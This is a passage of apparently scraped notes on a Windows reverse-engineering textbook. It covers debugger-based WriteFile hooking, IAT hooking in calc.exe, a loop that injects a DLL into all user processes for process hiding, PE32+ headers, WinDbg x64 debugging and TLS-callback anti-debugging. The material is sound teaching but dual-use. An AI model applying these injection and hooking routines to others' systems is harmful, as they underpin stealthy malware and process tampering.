EXCEPTION_NONCONTINUABLE_EXCEPTION EXCEPTION_PRIV_INSTRUCTION EXCEPTION_SINGLE_STEP EXCEPTION_STACK_OVERFLOW 30.4 - Practice30.5 - PrincipleWriteFile()1234567BOOL WriteFile( [in] HANDLE hFile, [in] LPCVOID lpBuffer, [in] DWORD nNumberOfBytesToWrite, [out, optional] LPDWORD lpNumberOfBytesWritten, [in, out, optional] LPOVERLAPPED lpOverlapped); main()123456789101112131415161718192021222324int main(int argc, char* argv[])&#123; DWORD dwPID; if( argc != 2 ) &#123; printf(&quot;\\nUSAGE : hookdbg.exe &lt;pid&gt;\\n&quot;); return 1; &#125; //Attach Process dwPID = atoi(argv[1]); if( !DebugActiveProcess(dwPID) ) &#123; printf(&quot;DebugActiveProcess(%d) failed!!!\\n&quot; &quot;Error Code = %d\\n&quot;, dwPID, GetLastError()); return 1; &#125; //Debugger loop DebugLoop(); return 0;&#125; DebugLoop()1234567891011121314151617181920212223242526272829303132void DebugLoop()&#123; DEBUG_EVENT de; DWORD dwContinueStatus; //Waiting for debuggee event. while( WaitForDebugEvent(&amp;de, INFINITE) ) &#123; dwContinueStatus = DBG_CONTINUE; //Debuggee process is created or attached. if( CREATE_PROCESS_DEBUG_EVENT == de.dwDebugEventCode ) &#123; OnCreateProcessDebugEvent(&amp;de); &#125; //Exception else if( EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode ) &#123; if( OnExceptionDebugEvent(&amp;de) ) continue; &#125; //Event of debuggee is terminated. else if( EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode ) &#123; // debuggee 종료 -&gt; debugger 종료 break; &#125; //Continue debuggee. ContinueDebugEvent(de.dwProcessId, de.dwThreadId, dwContinueStatus); &#125;&#125; DEBUG_EVENT structure123456789101112131415161718typedef struct _DEBUG_EVENT &#123; DWORD dwDebugEventCode; DWORD dwProcessId; DWORD dwThreadId; union &#123; EXCEPTION_DEBUG_INFO Exception; CREATE_THREAD_DEBUG_INFO CreateThread; CREATE_PROCESS_DEBUG_INFO CreateProcessInfo; EXIT_THREAD_DEBUG_INFO ExitThread; EXIT_PROCESS_DEBUG_INFO ExitProcess; LOAD_DLL_DEBUG_INFO LoadDll; UNLOAD_DLL_DEBUG_INFO UnloadDll; OUTPUT_DEBUG_STRING_INFO DebugString; RIP_INFO RipInfo; &#125; u;&#125; DEBUG_EVENT, *LPDEBUG_EVENT;//Source: https://learn.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-debug_event OnCreateProcessDebugEvent()12345678910111213141516BOOL OnCreateProcessDebugEvent(LPDEBUG_EVENT pde)&#123; // WriteFile() API 주소 구하기 g_pfWriteFile = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;WriteFile&quot;); // API Hook - WriteFile() // 첫 번째 byte 를 0xCC (INT 3) 으로 변경 // (orginal byte 는 백업) memcpy(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, sizeof(CREATE_PROCESS_DEBUG_INFO)); ReadProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chOrgByte, sizeof(BYTE), NULL); WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chINT3, sizeof(BYTE), NULL); return TRUE;&#125; OnExceptionDebugEvent()123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475BOOL OnExceptionDebugEvent(LPDEBUG_EVENT pde)&#123; CONTEXT ctx; PBYTE lpBuffer = NULL; DWORD dwNumOfBytesToWrite, dwAddrOfBuffer, i; PEXCEPTION_RECORD per = &amp;pde-&gt;u.Exception.ExceptionRecord; //BreakPoint exception (INT 3) if( EXCEPTION_BREAKPOINT == per-&gt;ExceptionCode ) &#123; //if BP address is the address of WriteFile() if( g_pfWriteFile == per-&gt;ExceptionAddress ) &#123; // #1. Unhook //0xCC -&gt; original byte WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chOrgByte, sizeof(BYTE), NULL); // #2. Thread Context ctx.ContextFlags = CONTEXT_CONTROL; GetThreadContext(g_cpdi.hThread, &amp;ctx); // #3. WriteFile(), param 2, 3 // 함수의 파라미터는 해당 프로세스의 스택에 존재함 // param 2 : ESP + 0x8 // param 3 : ESP + 0xC ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0x8), &amp;dwAddrOfBuffer, sizeof(DWORD), NULL); ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0xC), &amp;dwNumOfBytesToWrite, sizeof(DWORD), NULL); // #4. 임시 버퍼 할당 lpBuffer = (PBYTE)malloc(dwNumOfBytesToWrite+1); memset(lpBuffer, 0, dwNumOfBytesToWrite+1); // #5. WriteFile() 의 버퍼를 임시 버퍼에 복사 ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, lpBuffer, dwNumOfBytesToWrite, NULL); printf(&quot;\\n### original string ###\\n%s\\n&quot;, lpBuffer); // #6. 소문자 -&gt; 대문자 변환 for( i = 0; i &lt; dwNumOfBytesToWrite; i++ ) &#123; if( 0x61 &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= 0x7A ) lpBuffer[i] -= 0x20; &#125; printf(&quot;\\n### converted string ###\\n%s\\n&quot;, lpBuffer); // #7. 변환된 버퍼를 WriteFile() 버퍼로 복사 WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, lpBuffer, dwNumOfBytesToWrite, NULL); // #8. 임시 버퍼 해제 free(lpBuffer); // #9. Thread Context 의 EIP 를 WriteFile() 시작으로 변경 // (현재는 WriteFile() + 1 만큼 지나왔음) ctx.Eip = (DWORD)g_pfWriteFile; SetThreadContext(g_cpdi.hThread, &amp;ctx); // #10. Debuggee 프로세스를 진행시킴 ContinueDebugEvent(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE); Sleep(0); // #11. API Hook WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chINT3, sizeof(BYTE), NULL); return TRUE; &#125; &#125; return FALSE;&#125;CONTEXT (x86 32-bit)123456789101112131415161718192021222324252627typedef struct _CONTEXT &#123; DWORD ContextFlags; DWORD Dr0; DWORD Dr1; DWORD Dr2; DWORD Dr3; DWORD Dr6; DWORD Dr7; FLOATING_SAVE_AREA FloatSave; DWORD SegGs; DWORD SegFs; DWORD SegEs; DWORD SegDs; DWORD Edi; DWORD Esi; DWORD Ebx; DWORD Edx; DWORD Ecx; DWORD Eax; DWORD Ebp; DWORD Eip; DWORD SegCs; DWORD EFlags; DWORD Esp; DWORD SegSs; BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];&#125; CONTEXT; Chapter 31 - DebuggerOllyDbgIDA ProWinDbgChapter 32 - Displaying Korean in calc.exe 123456BOOL SetWindowTextA( [in] HWND hWnd, [in, optional] LPCSTR lpString);//Source: https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-setwindowtexta Here W stands for Wide Character version. A stands for ASCII version. Important: Notice that Little-endian is used on x32 platform. Thus, you must enter the hexadecimal unicode in reversed. In addition, Unicode is constituted by 2 bytes (16 bits). 32.4 - Practice1&gt; InjectDll.exe -e 3192 C:\\work\\hookiat.dll 32.5 - CodeDllMain()1234567891011121314151617181920212223BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123; switch( fdwReason ) &#123; case DLL_PROCESS_ATTACH : // original API 주소 저장 g_pOrgFunc = GetProcAddress(GetModuleHandle(L&quot;user32.dll&quot;), &quot;SetWindowTextW&quot;); // # hook // user32!SetWindowTextW() 를 hookiat!MySetWindowText() 로 후킹 hook_iat(&quot;user32.dll&quot;, g_pOrgFunc, (PROC)MySetWindowTextW); break; case DLL_PROCESS_DETACH : // # unhook // calc.exe 의 IAT 를 원래대로 복원 hook_iat(&quot;user32.dll&quot;, (PROC)MySetWindowTextW, g_pOrgFunc); break; &#125; return TRUE;&#125;MySetWindowTextW()1234567891011121314151617181920212223BOOL WINAPI MySetWindowTextW(HWND hWnd, LPWSTR lpString)&#123; wchar_t* pNum = L&quot;영일이삼사오육칠팔구&quot;; //0123456789 or 零一二三四五六七八九 wchar_t temp[2] = &#123;0,&#125;; int i = 0, nLen = 0, nIndex = 0; nLen = wcslen(lpString); for(i = 0; i &lt; nLen; i++) &#123; // &#x27;수&#x27;문자를 &#x27;한글&#x27;문자로 변환 // lpString 은 wide-character (2 byte) 문자열 if( L&#x27;0&#x27; &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= L&#x27;9&#x27; ) &#123; temp[0] = lpString[i]; nIndex = _wtoi(temp); lpString[i] = pNum[nIndex]; &#125; &#125; // user32!SetWindowTextW() API 호출 // (위에서 lpString 버퍼 내용을 변경하였음) return ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);&#125; hook_iat()123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263BOOL hook_iat(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)&#123; HMODULE hMod; LPCSTR szLibName; PIMAGE_IMPORT_DESCRIPTOR pImportDesc; PIMAGE_THUNK_DATA pThunk; DWORD dwOldProtect, dwRVA; PBYTE pAddr; // hMod, pAddr = ImageBase of calc.exe // = VA to MZ signature (IMAGE_DOS_HEADER) hMod = GetModuleHandle(NULL); pAddr = (PBYTE)hMod; // pAddr = VA to PE signature (IMAGE_NT_HEADERS) pAddr += *((DWORD*)&amp;pAddr[0x3C]); // dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table dwRVA = *((DWORD*)&amp;pAddr[0x80]); // pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA); for( ; pImportDesc-&gt;Name; pImportDesc++ ) &#123; // szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name szLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name); if( !_stricmp(szLibName, szDllName) ) &#123; // pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk // = VA to IAT(Import Address Table) pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + pImportDesc-&gt;FirstThunk); // pThunk-&gt;u1.Function = VA to API for( ; pThunk-&gt;u1.Function; pThunk++ ) &#123; if( pThunk-&gt;u1.Function == (DWORD)pfnOrg ) &#123; //Modify the attribute of memory to E/R/W VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, 4, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); //Modify IAT value (Hooking). pThunk-&gt;u1.Function = (DWORD)pfnNew; //Redo modification. VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, 4, dwOldProtect, &amp;dwOldProtect); return TRUE; &#125; &#125; &#125; &#125; return FALSE;&#125; IAT structure123456hMod = GetModuleHandle(NULL); // hMod = ImageBasepAddr = (PBYTE)hMod; // pAddr = ImageBasepAddr += *((DWORD*)&amp;pAddr[0x3C]); // pAddr = &quot;PE&quot; signaturedwRVA = *((DWORD*)&amp;pAddr[0x80]); // dwRVA = RVA of IMAGE_IMPORT_DESCRIPTORpImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA); Chapter 33 - Hidden Process33.3 - Hidden ProcessCreateToolhelp32Snapshot()123456HANDLE CreateToolhelp32Snapshot( [in] DWORD dwFlags, [in] DWORD th32ProcessID);//Source: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot EnumProcess() 1234567BOOL EnumProcesses( [out] DWORD *lpidProcess, [in] DWORD cb, [out] LPDWORD lpcbNeeded);//Source: https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocessesZwQuerySystemInformation()12345678NTSTATUS WINAPI ZwQuerySystemInformation( _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass, _Inout_ PVOID SystemInformation, _In_ ULONG SystemInformationLength, _Out_opt_ PULONG ReturnLength);//Source: https://learn.microsoft.com/en-us/windows/win32/sysinfo/zwquerysysteminformation 33.4 - Practice123456789101112131415161718192021222324252627282930313233BOOL InjectAllProcess(int nMode, LPCTSTR szDllPath)&#123; DWORD dwPID = 0; HANDLE hSnapShot = INVALID_HANDLE_VALUE; PROCESSENTRY32 pe; // Get the snapshot of the system pe.dwSize = sizeof( PROCESSENTRY32 ); hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL ); // find process Process32First(hSnapShot, &amp;pe); do &#123; dwPID = pe.th32ProcessID; // 시스템의 안정성을 위해서 // PID 가 100 보다 작은 시스템 프로세스에 대해서는 // DLL Injection 을 수행하지 않는다. if( dwPID &lt; 100 ) continue; if( nMode == INJECTION_MODE ) InjectDll(dwPID, szDllPath); else EjectDll(dwPID, szDllPath); &#125; while( Process32Next(hSnapShot, &amp;pe) ); CloseHandle(hSnapShot); return TRUE;&#125; 33.5 - HideProcChapter 34 - Global API HookingChapter 35 - How to Choose Your ToolsChapter 36 - 64-bit36.1 - 64-bit Processing Terminology Meaning AMB64 64-bit processors developed by AMD. EM64T 64-bit processors developed by Intel. They support AMD64. Intel64 New name of EM64T. IA-64 64-bit CPUs developed by Intel and HP. x86 CPUs of Intel IA-32, IA-16 and IA-8. x64 AMD64 &amp; Intel64 Chapter 37 - x64 ProcessorChapter 38 - PE32+IMAGE_NT_HEADERS123456789101112131415161718192021typedef struct _IMAGE_NT_HEADERS64 &#123; DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader;&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; /* &quot;PE&quot;\\0\\0 */ /* 0x00 */ IMAGE_FILE_HEADER FileHeader; /* 0x04 */ IMAGE_OPTIONAL_HEADER32 OptionalHeader; /* 0x18 */&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;#ifdef _WIN64typedef IMAGE_NT_HEADERS64 IMAGE_NT_HEADERS;typedef PIMAGE_NT_HEADERS64 PIMAGE_NT_HEADERS;#elsetypedef IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS;typedef PIMAGE_NT_HEADERS32 PIMAGE_NT_HEADERS;#endif//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h IMAGE_FILE_HEADER12345678910111213141516171819202122232425262728293031323334353637383940414243#define IMAGE_FILE_MACHINE_UNKNOWN 0#define IMAGE_FILE_MACHINE_TARGET_HOST 0x0001#define IMAGE_FILE_MACHINE_I386 0x014c#define IMAGE_FILE_MACHINE_R3000 0x0162#define IMAGE_FILE_MACHINE_R4000 0x0166#define IMAGE_FILE_MACHINE_R10000 0x0168#define IMAGE_FILE_MACHINE_WCEMIPSV2 0x0169#define IMAGE_FILE_MACHINE_ALPHA 0x0184#define IMAGE_FILE_MACHINE_SH3 0x01a2#define IMAGE_FILE_MACHINE_SH3DSP 0x01a3#define IMAGE_FILE_MACHINE_SH3E 0x01a4#define IMAGE_FILE_MACHINE_SH4 0x01a6#define IMAGE_FILE_MACHINE_SH5 0x01a8#define IMAGE_FILE_MACHINE_ARM 0x01c0#define IMAGE_FILE_MACHINE_THUMB 0x01c2#define IMAGE_FILE_MACHINE_ARMNT 0x01c4#define IMAGE_FILE_MACHINE_AM33 0x01d3#define IMAGE_FILE_MACHINE_POWERPC 0x01f0#define IMAGE_FILE_MACHINE_POWERPCFP 0x01f1#define IMAGE_FILE_MACHINE_IA64 0x0200#define IMAGE_FILE_MACHINE_MIPS16 0x0266#define IMAGE_FILE_MACHINE_ALPHA64 0x0284#define IMAGE_FILE_MACHINE_AXP64 IMAGE_FILE_MACHINE_ALPHA64#define IMAGE_FILE_MACHINE_MIPSFPU 0x0366#define IMAGE_FILE_MACHINE_MIPSFPU16 0x0466#define IMAGE_FILE_MACHINE_TRICORE 0x0520#define IMAGE_FILE_MACHINE_CEF 0x0cef#define IMAGE_FILE_MACHINE_EBC 0x0ebc#define IMAGE_FILE_MACHINE_CHPE_X86 0x3a64#define IMAGE_FILE_MACHINE_AMD64 0x8664#define IMAGE_FILE_MACHINE_M32R 0x9041#define IMAGE_FILE_MACHINE_ARM64EC 0xa641#define IMAGE_FILE_MACHINE_ARM64X 0xa64e#define IMAGE_FILE_MACHINE_ARM64 0xaa64#define IMAGE_FILE_MACHINE_RISCV32 0x5032#define IMAGE_FILE_MACHINE_RISCV64 0x5064#define IMAGE_FILE_MACHINE_RISCV128 0x5128#define IMAGE_FILE_MACHINE_CEE 0xc0ee//Source: //Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h IMAGE_OPTIONAL_HEADER12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788typedef struct _IMAGE_OPTIONAL_HEADER &#123; /* Standard fields */ WORD Magic; /* 0x10b or 0x107 */ /* 0x00 */ BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; /* 0x10 */ DWORD BaseOfCode; DWORD BaseOfData; /* NT additional fields */ DWORD ImageBase; DWORD SectionAlignment; /* 0x20 */ DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; /* 0x30 */ WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; /* 0x40 */ WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; /* 0x50 */ DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; /* 0x60 */ /* 0xE0 */&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;typedef struct _IMAGE_OPTIONAL_HEADER64 &#123; WORD Magic; /* 0x20b */ BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit; ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;/* Possible Magic values */#define IMAGE_NT_OPTIONAL_HDR32_MAGIC 0x10b#define IMAGE_NT_OPTIONAL_HDR64_MAGIC 0x20b#define IMAGE_ROM_OPTIONAL_HDR_MAGIC 0x107#ifdef _WIN64#define IMAGE_SIZEOF_NT_OPTIONAL_HEADER IMAGE_SIZEOF_NT_OPTIONAL64_HEADER#define IMAGE_NT_OPTIONAL_HDR_MAGIC IMAGE_NT_OPTIONAL_HDR64_MAGIC#else#define IMAGE_SIZEOF_NT_OPTIONAL_HEADER IMAGE_SIZEOF_NT_OPTIONAL32_HEADER#define IMAGE_NT_OPTIONAL_HDR_MAGIC IMAGE_NT_OPTIONAL_HDR32_MAGIC#endif//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h Stack &amp; Heap1234567891011121314151617181920typedef struct _IMAGE_THUNK_DATA64 &#123; union &#123; ULONGLONG ForwarderString; ULONGLONG Function; ULONGLONG Ordinal; ULONGLONG AddressOfData; &#125; u1;&#125; IMAGE_THUNK_DATA64,*PIMAGE_THUNK_DATA64;#pragma pack(pop)typedef struct _IMAGE_THUNK_DATA32 &#123; union &#123; DWORD ForwarderString; DWORD Function; DWORD Ordinal; DWORD AddressOfData; &#125; u1;&#125; IMAGE_THUNK_DATA32,*PIMAGE_THUNK_DATA32;//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h IMAGE_IMPORT_DESCRIPTOR1234567891011121314151617typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; /* 0 for terminating null import descriptor */ DWORD OriginalFirstThunk; /* RVA to original unbound IAT */ &#125; DUMMYUNIONNAME; DWORD TimeDateStamp; /* 0 if not bound, * -1 if bound, and real date\\time stamp * in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT * (new BIND) * otherwise date/time stamp of DLL bound to * (Old BIND) */ DWORD ForwarderChain; /* -1 if no forwarders */ DWORD Name; /* RVA to IAT (if bound this IAT has actual addresses) */ DWORD FirstThunk;&#125; IMAGE_IMPORT_DESCRIPTOR,*PIMAGE_IMPORT_DESCRIPTOR; Chapter 39 - WinDbg Chapter 40 - 64-bit Debugging40.1 - Debugger on x64 Platform OS PE32 PE32+ 32-bit OllyDbg, IDA Pro, WinDbg IDA Pro (Disassemble only) 64-bit OllyDbg, IDA Pro, WinDbg IDA Pro, WinDbg 40.2 - x64 DebuggingWOW64Test123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#include &quot;Shlobj.h&quot;#include &quot;tchar.h&quot;#pragma comment(lib, &quot;Shell32.lib&quot;)int _tmain(int argc, TCHAR* argv[])&#123; HKEY hKey = NULL; HANDLE hFile = INVALID_HANDLE_VALUE; TCHAR szPath[MAX_PATH] = &#123;0,&#125;; //////////////// // system32 folder if( GetSystemDirectory(szPath, MAX_PATH) ) &#123; _tprintf(L&quot;1) system32 path = %s\\n&quot;, szPath); &#125; //////////////// // File size _tcscat_s(szPath, L&quot;\\\\kernel32.dll&quot;); hFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if( hFile != INVALID_HANDLE_VALUE ) &#123; _tprintf(L&quot;2) File size of \\&quot;%s\\&quot; = %d\\n&quot;, szPath, GetFileSize(hFile, NULL)); CloseHandle(hFile); &#125; //////////////// // Program Files if( SHGetSpecialFolderPath(NULL, szPath, CSIDL_PROGRAM_FILES, FALSE) ) &#123; _tprintf(L&quot;3) Program Files path = %s\\n&quot;, szPath); &#125; //////////////// // Registry if( ERROR_SUCCESS == RegCreateKey(HKEY_LOCAL_MACHINE, L&quot;SOFTWARE\\\\ReverseCore&quot;, &amp;hKey) ) &#123; RegCloseKey(hKey); _tprintf(L&quot;4) Create Registry Key : HKLM\\\\SOFTWARE\\\\ReverseCore\\n&quot;); &#125; return 0;&#125; 40.3 - WOW64Test_x86.exe Run code. Enable \"x64 Compatibility-mode [single-step] Startup main() function. 40.4 - WOW64Test_x64.exeWe use WinDbg to debug this executableFile -&gt; Launch Executable Firstly, we need to obtain the EP address.1&gt; !dh WOW64Test_x64 Display PE header. Go into EP:1&gt; g WOW64Test_x64 + 142C Go into EP. Show more instructions:1&gt; u eip L10 Display more instructions. Trace the jmp instruction at 00000001 4000143912&gt; g WOW64Test_x64 + 12b4&gt; u eip L60 Trace function main() function12&gt; bp KERNEL32!GetCommandLineW&gt; g Set breakpoint. Obtain the return address from stack12&gt; r rsp&gt; dq rsp View register, and then dump the register. 12&gt; g 00000001`40001381&gt; u eip L20 Go to the address that we obtained, this is the main() function that we want since the return address is the address of main function. The assembly code above is the assembly code of main(). 12&gt; g 00000001`400013ea&gt; r Arguments. 1&gt; db rdx Dump rdx to show argument. 1&gt; db rdx Dump r8 to show stack pointers. 1&gt; db 023b3ac0 l200 Dump the stack. The address 023b3ac0 is the address of the first element of the array of last result (`db rdx`). Always remember little-endian is used. Chapter 41 - ASLRASLR stands for Address Space Layout Randomization. Windows OS that apply ASLR: OS Kernal Version Windows 2000 5.0 Windows XP 5.1 Windows Server 2003 5.2 Windows Vista 6.0 Windows Server 2008 6.0 Windows Server 2008 R2 6.1 Windows 7 6.1 IMAGE_FILE_HEADER\\Characteristics IMAGE_FILE_RELOCS_STRIPPED Chapter 42 - Session of Kernel 6Session 0 Isolation Chapter 43 - DLL Injection in Kernel 6Chapter 44 - InjDll.exe——A Tool for DLL InjectionChapter 45 - TLS Callback FunctionFrom this point on, this book will introduce more advanced topics in reverse engineering. Here, TLS stands for Thread Local Storage, instead of Transport Layer Security used in networking. TLS Callback Function is commonly used in anti-debugging. 45.1 - Practice#1 HelloTls.exe Running HelloTls.exe Debugging HelloTls.exe OllyDbg: HelloTls.exe is terminated. 45.2 - TLS IMAGE_NT_HEADERS\\IMAGE-OPTIOAL_HEADER\\IMAGE_DATA_DIRECTORY[9] -> TLS Table 123456789101112131415161718192021222324252627typedef struct _IMAGE_TLS_DIRECTORY64 &#123; ULONGLONG StartAddressOfRawData; ULONGLONG EndAddressOfRawData; ULONGLONG AddressOfIndex; ULONGLONG AddressOfCallBacks; DWORD SizeOfZeroFill; DWORD Characteristics;&#125; IMAGE_TLS_DIRECTORY64, *PIMAGE_TLS_DIRECTORY64;typedef struct _IMAGE_TLS_DIRECTORY32 &#123; DWORD StartAddressOfRawData; DWORD EndAddressOfRawData; DWORD AddressOfIndex; DWORD AddressOfCallBacks; DWORD SizeOfZeroFill; DWORD Characteristics;&#125; IMAGE_TLS_DIRECTORY32, *PIMAGE_TLS_DIRECTORY32;#ifdef _WIN64typedef IMAGE_TLS_DIRECTORY64 IMAGE_TLS_DIRECTORY;typedef PIMAGE_TLS_DIRECTORY64 PIMAGE_TLS_DIRECTORY;#elsetypedef IMAGE_TLS_DIRECTORY32 IMAGE_TLS_DIRECTORY;typedef PIMAGE_TLS_DIRECTORY32 PIMAGE_TLS_DIRECTORY;#endif//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h IMAGE_TLS_DIRECTORY AddressOfCallbacks stores an array of pointers which point to callback functions. It is a significant member in structure IMAGE_TLS_DIRECTORY. The array is ended with NULL value. PEView.exe: AddressOfCallbacks Notice that we can register multiple TLS callback functions by modifying the program, even though the original program contains only one TLS callback. 45.3 - TLS Callback FunctionA TLS callback function is invoked whenever a process thread is created or terminated.When the main thread is created, the TLS callback is executed before the program’s entry point (EP).This behavior can be leveraged for anti-debugging purposes. Notice that the TLS callback function is invoked when the program is terminated. IMAGE_TLS_CALLBACK1234567typedef VOID (CALLBACK *PIMAGE_TLS_CALLBACK)( LPVOID DllHandle, DWORD Reason, LPVOID Reserved);//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h Notice that the definition of TLS callback function is similar to DllMain():1234567BOOL WINAPI DllMain( _In_ HINSTANCE hinstDLL, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved);//Source: https://learn.microsoft.com/en-us/windows/win32/dlls/dllmainThe TLS callback function and DllMain() have the same parameter order.For a callback function, DllHandle is the address of the module (its load address), and Reason indicates why the callback function is being invoked. There are four possible values for Reason:1234567/* Argument 1 passed to the DllEntryProc. */#define DLL_PROCESS_DETACH 0 /* detach process (unload library) */#define DLL_PROCESS_ATTACH 1 /* attach process (load library) */#define DLL_THREAD_ATTACH 2 /* attach new thread */#define DLL_THREAD_DETACH 3 /* detach thread *///Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h 45.4 - Practice#2 TlsTest.exe12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;windows.h&gt;#pragma comment(linker, &quot;/INCLUDE:__tls_used&quot;)void print_console(char* szMsg)&#123; HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE); WriteConsoleA(hStdout, szMsg, strlen(szMsg), NULL, NULL);&#125;void NTAPI TLS_CALLBACK1(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123; char szMsg[80] = &#123;0,&#125;; wsprintfA(szMsg, &quot;TLS_CALLBACK1() : DllHandle = %X, Reason = %d\\n&quot;, DllHandle, Reason); print_console(szMsg);&#125;void NTAPI TLS_CALLBACK2(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123; char szMsg[80] = &#123;0,&#125;; wsprintfA(szMsg, &quot;TLS_CALLBACK2() : DllHandle = %X, Reason = %d\\n&quot;, DllHandle, Reason); print_console(szMsg);&#125;#pragma data_seg(&quot;.CRT$XLX&quot;) PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, TLS_CALLBACK2, 0 &#125;;#pragma data_seg()DWORD WINAPI ThreadProc(LPVOID lParam)&#123; print_console(&quot;ThreadProc() start\\n&quot;); print_console(&quot;ThreadProc() end\\n&quot;); return 0;&#125;int main(void)&#123; HANDLE hThread = NULL; print_console(&quot;main() start\\n&quot;); hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); WaitForSingleObject(hThread, 60*1000); CloseHandle(hThread); print_console(&quot;main() end\\n&quot;); return 0;&#125; The calling order of TLS function: DLL_PROCESS_ATTACH DLL_THREAD_ATTACH DLL_THREAD_DETACH DLL_PROCESS_DETACH TlsTest.exe 45.5 - Debugging TLS Callback FunctionEnable “System breakpoint”: Debugging options -> Events -> System breakpoint Or using Olly Advanced: Plugin -> Plly Advanced -> Anti-Debug 2 -> Break on TLS Callback 45.6 - Manually Add TLS Callback Function.Before modification: Modification: Modifying .rsrc section header. HxD: IMAGE_DATA_DIRECTORY 